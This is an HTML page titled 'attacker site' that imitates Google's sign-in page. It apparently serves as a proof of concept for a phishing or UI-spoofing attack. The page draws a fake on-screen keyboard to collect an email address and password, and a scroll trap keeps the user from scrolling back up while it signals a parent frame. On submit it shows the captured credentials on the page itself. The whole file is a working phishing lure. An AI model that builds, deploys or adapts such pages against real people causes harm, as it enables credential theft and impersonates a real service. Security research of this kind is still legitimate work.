<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0"
    />
    <title>attacker site</title>
    <style>
      body {
        font-family:
          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
          Arial, sans-serif;
        text-align: center;
        margin: 0;
        min-height: 200vh;
        color: #333;
        background: #fff;
        user-select: none;
        -webkit-user-select: none;
      }
      .spacer {
        height: 95vh;
        background: #f8f9fa;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 0 20px;
        color: #5f6368;
        border-bottom: 1px solid #ccc;
      }
      .form-container {
        padding: 30px 20px;
        max-width: 350px;
        margin: 0 auto;
      }
      .logo {
        font-size: 26px;
        font-weight: 500;
        color: #202124;
        margin-bottom: 8px;
      }
      .subtitle {
        color: #202124;
        font-size: 16px;
        margin-bottom: 25px;
      }

      .fake-input {
        width: 100%;
        height: 52px;
        margin: 8px 0;
        border: 1px solid #dadce0;
        border-radius: 4px;
        font-size: 16px;
        box-sizing: border-box;
        text-align: left;
        padding: 0 15px;
        line-height: 52px;
        color: #202124;
        cursor: pointer;
        background: #fff;
      }
      .fake-input.active {
        border: 2px solid #1a73e8;
        outline: none;
      }
      .fake-input.placeholder {
        color: #5f6368;
      }
      .btn {
        width: 100%;
        padding: 12px;
        background: #1a73e8;
        color: #fff;
        border: none;
        border-radius: 4px;
        font-size: 14px;
        font-weight: 500;
        margin-top: 25px;
        cursor: pointer;
      }

      #fake-keyboard {
        display: none;
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        background: #e8eaec;
        padding: 10px 4px 20px 4px;
        box-sizing: border-box;
        z-index: 999999;
      }
      .kbd-row {
        display: flex;
        justify-content: center;
        margin-bottom: 10px;
        gap: 6px;
      }
      .key {
        position: relative;
        background: #ffffff;
        border-radius: 8px;
        height: 38px;
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        color: #111;
        box-shadow: 0 1px 1px rgba(0, 0, 0, 0.15);
        cursor: pointer;
      }
      .key .sup {
        position: absolute;
        top: 4px;
        right: 6px;
        font-size: 11px;
        color: #5f6368;
        font-weight: 500;
      }
      .key:active {
        background: #dce0e3;
      }

      .key.special {
        background: #d3e3cd;
        font-size: 18px;
        color: #111;
      }
      .key.special:active {
        background: #c2d3bc;
      }

      .key.wide {
        flex: 1.35;
      }
      .key.space {
        flex: 4.5;
        font-size: 15px;
        color: #111;
        background: #ffffff;
      }
      .key.enter {
        font-size: 24px;
      }
      .spacer-half {
        flex: 0.5;
      }

      #log {
        display: none;
        margin-top: 20px;
        padding: 15px;
        background: #fce8e6;
        color: #d32f2f;
        font-weight: bold;
        border: 1px dashed #d32f2f;
        word-wrap: break-word;
      }
    </style>
  </head>
  <body>
    <div class="spacer">Scroll down to proceed to accounts.google.com</div>

    <div class="form-container">
      <div class="logo">Google</div>
      <div class="subtitle">Sign in</div>

      <div
        id="inp-user"
        class="fake-input placeholder"
        onclick="focusField('user')"
      >
        Email or phone
      </div>
      <div
        id="inp-pass"
        class="fake-input placeholder"
        onclick="focusField('pass')"
      >
        Enter your password
      </div>

      <button class="btn" onclick="submitForm()">Next</button>
      <div id="log"></div>
    </div>

    <div id="fake-keyboard">
      <div class="kbd-row" id="row1"></div>

      <div class="kbd-row">
        <div class="spacer-half"></div>
        <div
          class="kbd-row"
          style="flex: 9; margin: 0; gap: 6px"
          id="row2"
        ></div>
        <div class="spacer-half"></div>
      </div>

      <div class="kbd-row" id="row3">
        <div class="key special wide" onclick="typeChar('SHIFT')">⇧</div>
        <div
          class="kbd-row"
          style="flex: 7; margin: 0; gap: 6px"
          id="row3-letters"
        ></div>
        <div class="key special wide" onclick="typeChar('DEL')">⌫</div>
      </div>

      <div class="kbd-row">
        <div class="key special wide" onclick="typeChar('CLOSE')">?123</div>
        <div class="key special" onclick="typeChar(',')">,</div>
        <div class="key" onclick="typeChar('EMOJI')">☺</div>
        <div class="key space" onclick="typeChar(' ')">Indonesia</div>
        <div class="key special" onclick="typeChar('.')">.</div>
        <div class="key special wide enter" onclick="submitForm()">↵</div>
      </div>
    </div>

    <script>
      const row1 = [
        { c: "q", n: "1" },
        { c: "w", n: "2" },
        { c: "e", n: "3" },
        { c: "r", n: "4" },
        { c: "t", n: "5" },
        { c: "y", n: "6" },
        { c: "u", n: "7" },
        { c: "i", n: "8" },
        { c: "o", n: "9" },
        { c: "p", n: "0" },
      ];
      const row2 = ["a", "s", "d", "f", "g", "h", "j", "k", "l"];
      const row3 = ["z", "x", "c", "v", "b", "n", "m"];

      let isShift = false;
      let activeField = null;
      let data = { user: "", pass: "" };

      if ("virtualKeyboard" in navigator) {
        navigator.virtualKeyboard.overlaysContent = true;
      }

      function renderKeys() {
        document.getElementById("row1").innerHTML = row1
          .map(
            (k) => `
          <div class="key" onclick="typeChar('${k.c}')">
            ${isShift ? k.c.toUpperCase() : k.c}
            <span class="sup">${k.n}</span>
          </div>`,
          )
          .join("");

        document.getElementById("row2").innerHTML = row2
          .map(
            (k) =>
              `<div class="key" onclick="typeChar('${k}')">${isShift ? k.toUpperCase() : k}</div>`,
          )
          .join("");
        document.getElementById("row3-letters").innerHTML = row3
          .map(
            (k) =>
              `<div class="key" onclick="typeChar('${k}')">${isShift ? k.toUpperCase() : k}</div>`,
          )
          .join("");
      }
      renderKeys();

      function focusField(field) {
        activeField = field;
        document.getElementById("inp-user").classList.remove("active");
        document.getElementById("inp-pass").classList.remove("active");
        document.getElementById("inp-" + field).classList.add("active");
        document.getElementById("fake-keyboard").style.display = "block";
      }

      function typeChar(char) {
        if (!activeField) return;

        if (char === "CLOSE" || char === "EMOJI") return;

        if (char === "SHIFT") {
          isShift = !isShift;
          renderKeys();
          return;
        }

        if (char === "DEL") {
          data[activeField] = data[activeField].slice(0, -1);
        } else {
          let c = isShift && char.length === 1 ? char.toUpperCase() : char;
          data[activeField] += c;
        }

        updateDisplay();
      }

      function updateDisplay() {
        let uEl = document.getElementById("inp-user");
        let pEl = document.getElementById("inp-pass");

        if (data.user) {
          uEl.innerText = data.user;
          uEl.classList.remove("placeholder");
        } else {
          uEl.innerText = "Email or phone";
          uEl.classList.add("placeholder");
        }

        if (data.pass) {
          pEl.innerText = "•".repeat(data.pass.length);
          pEl.classList.remove("placeholder");
        } else {
          pEl.innerText = "Enter your password";
          pEl.classList.add("placeholder");
        }
      }

      function submitForm() {
        document.getElementById("fake-keyboard").style.display = "none";
        if (activeField) {
          document
            .getElementById("inp-" + activeField)
            .classList.remove("active");
        }
        activeField = null;

        if (data.user && data.pass) {
          let log = document.getElementById("log");
          log.style.display = "block";
          log.innerHTML =
            "CAPTURED:<br>User: " + data.user + "<br>Pass: " + data.pass;
        }
      }

      let maxScroll = 0;
      let isTrapSnapped = false;

      window.addEventListener("scroll", () => {
        if (window.scrollY > maxScroll) {
          maxScroll = window.scrollY;
          if (maxScroll > window.innerHeight * 0.6 && !isTrapSnapped) {
            isTrapSnapped = true;
            window.parent.postMessage("SNAP_TRAP", "*");
          }
        } else if (window.scrollY < maxScroll - 2) {
          window.scrollTo({ top: maxScroll, behavior: "instant" });
        }
      });
    </script>
  </body>
</html>
